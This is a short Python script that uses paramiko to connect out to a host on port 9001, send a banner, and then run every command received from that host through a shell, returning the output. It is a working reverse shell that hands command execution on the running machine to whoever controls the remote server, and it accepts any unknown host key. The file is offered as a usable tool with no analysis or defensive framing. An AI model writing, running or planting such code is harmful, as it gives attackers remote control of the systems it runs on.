import subprocess
import threading
import paramiko
import sys



if len(sys.argv) != 5:
	print('Usage: python sshrcmd.py <host> <user> <password> <banner>')
	sys.exit(1)

host = sys.argv[1]
user = sys.argv[2]
passwd = sys.argv[3]
banner = sys.argv[4]

client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
try:
	client.connect(host, port=9001, username=user, password = passwd)
except Exception as e:
	print('Caught Exception: %s...exiting' %(e))
	sys.exit(0)	
session = client.get_transport().open_session()
if session.active:
	session.send(banner)
	command = session.recv(1024)
	while True:
		command = session.recv(1024)
		try:
			output = subprocess.check_output(command, shell=True)
			session.send(output)
		except Exception as e:
			session.send(str(e))
	session.close()
	
			
		
				 
			



